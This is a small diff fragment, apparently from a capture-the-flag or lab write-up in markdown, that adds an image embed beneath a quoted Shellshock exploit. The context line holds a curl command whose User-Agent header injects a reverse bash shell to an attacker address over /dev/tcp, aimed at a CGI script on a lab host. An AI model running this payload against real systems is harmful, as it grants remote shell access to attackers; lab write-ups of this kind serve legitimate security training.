@@ -38,3 +38,5 @@ Nmap done: 1 IP address (1 host up) scanned in 33.39 seconds
 ```python
 curl -A "() { :; }; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp/10.8.74.185/7890 0>&1" "http://10.10.245.192/cgi-bin/test.cgi"
 ```
+
+![[Pasted image 20240224212355.png]]
